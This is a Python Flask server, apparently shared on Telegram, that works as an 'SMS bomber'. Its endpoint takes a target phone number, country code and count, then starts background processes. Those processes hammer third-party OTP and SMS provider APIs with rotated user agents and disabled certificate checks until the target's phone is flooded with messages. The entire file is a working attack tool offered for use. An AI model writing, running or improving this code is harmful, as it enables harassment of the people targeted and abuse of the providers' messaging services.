#Code by @DiverseVariant on Telegram
import json
import requests
import random
import urllib3
import multiprocessing
import os
import signal
from flask import *

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = "WolfiexD_or_DiverseVariant"

running_sms_attacks = {}
#result_sms_queues = {}
thread_counter = 0 


_DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}


def random_ua():
    ua = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    ]
    return random.choice(ua)


def get_data(file="apitest.json"):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"Error [get_data()]: {e}")
        return None


def replace_placeholders(data, target, cc):
    if isinstance(data, dict):
        for key, value in data.items():
            data[key] = replace_placeholders(value, target, cc)
    elif isinstance(data, list):
        for index, item in enumerate(data):
            data[index] = replace_placeholders(item, target, cc)
    elif isinstance(data, str):
        data = data.replace("{target}", target)
        data = data.replace("{cc}", cc)
    return data


def attack(json_data, target, cc):
    json_data = replace_placeholders(json_data, target, cc)
    url = json_data.get("url")
    identifier = json_data.get("identifier", "")
    headers = json_data.get("headers", _DEFAULT_HEADERS)
    headers["user-agent"] = random_ua()
    method = json_data.get("method")

    try:
        if method == "GET":
            params = json_data.get("params", {})
            r = requests.get(
                url, headers=headers, params=params, verify=False, allow_redirects=False, timeout=10
            )
        elif method == "POST":
            data = json_data.get("data", {})
            jsonn = json_data.get("json", {})
            r = requests.post(
                url, headers=headers, data=data, json=jsonn, verify=False, allow_redirects=False, timeout=10
            )

        if identifier in r.text:
            return True
        return False
    except Exception as e:
        print(f"ERROR [attack()]: {e}")
        return False


jsonData = get_data("apidata.json")


def run_sms_attack(providers, amount=10, target="0000000000", cc="91", process_id=None):
   # result_sms_queue = multiprocessing.Queue()

    count = 0
    fail = 0

    while count < int(amount):
        if process_id and process_id not in running_sms_attacks:
            break

        if attack(random.choice(providers), target, cc):
            count += 1
        else:
            fail += 1

       # result_sms_queue.put({"success": count, "fail": fail})
       # result_sms_queues[os.getpid()] = result_sms_queue


@app.route("/smsbomber/start")
@app.route("/smsbomber/start/")
def API_smsbomberStart():
    global thread_counter
    
    if thread_counter>50:
        return jsonify(error="RATE LIMIT, TOO MANY PROCESSES!")
    
    target = request.args.get("mobile")
    cc = request.args.get("cc")
    amount = request.args.get("amount", 10)
    
    if not target or not cc:
        return jsonify(error="mobile OR cc PARAM NOT FOUND!", status="NOK")

    try:
        int(target)
        int(cc)
        int(amount)
    except:
        return jsonify(error="INVALID mobile OR cc OR amount PASSES!", status="NOK")

    if len(cc) not in range(1, 4) or len(target) not in range(8, 11) or int(target) < 0 or int(cc) < 0 or int(
        amount
    ) < 0:
        return jsonify(error="INVALID mobile OR cc OR amount PASSED!", status="NOK")
    providers = jsonData.get("sms").get(cc)
    if not providers:
        return jsonify(error="COUNTRY NOT SUPPORTED!", status="NOK")

    process = multiprocessing.Process(target=run_sms_attack, args=(providers, amount, target, cc))
    process.daemon = True
    process.start()
    process_id = str(process.pid)
    running_sms_attacks[process_id] = process
    thread_counter += 1
    return jsonify(
        process_id=process_id, amount=amount, mobile=target, countryCode=cc, status="OK", running_sms_attacks=thread_counter
    )


@app.route("/smsbomber/end")
@app.route("/smsbomber/end/")
def API_smsbomberEnd():
    global thread_counter
    process_id = request.args.get("process_id")
    if not process_id:
        return jsonify(error="NO process_id PASSED!", status="NOK")

    if process_id in running_sms_attacks:
        # Stop the process

        process = running_sms_attacks[process_id]
        os.kill(process.pid, signal.SIGTERM)
        del running_sms_attacks[process_id]

      #  results_queue = result_sms_queues.get(process.pid)
      #  result = {"success": 0, "fail": 0}
      #  if results_queue:
      #      result = results_queue.get()
        thread_counter -= 1

        return jsonify(status="OK", message="SMS BOMBING STOPPED!", running_sms_attacks=thread_counter)
    else:
        return jsonify(error="NO PROCESS FOUND.", status="NOK")


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)
